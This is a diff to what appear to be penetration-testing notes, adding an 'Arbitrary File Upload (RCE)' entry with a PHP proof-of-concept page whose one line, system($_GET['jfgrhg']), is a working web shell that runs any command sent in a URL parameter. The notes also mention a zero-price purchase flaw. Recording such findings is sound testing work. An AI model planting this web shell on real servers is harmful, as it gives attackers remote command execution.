@@ -65,4 +65,29 @@ __raft-medium-directories_long.txt__
 #### Arbitrary Price change (0 price buy)
 ![[Pasted image 20230809101807.png]]
 
+#### Arbitary File Upload (RCE)
+![[Pasted image 20230809171457.png]]
+
+```php
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC</title>
+</head>
+<body>
+
+<script>
+console.log("can execute arbitary JS code")
+</script>
+
+<h1>
+<?php echo system($_GET['jfgrhg']) ?>
+</h1>
+
+</body>
+</html>
+```
+
 
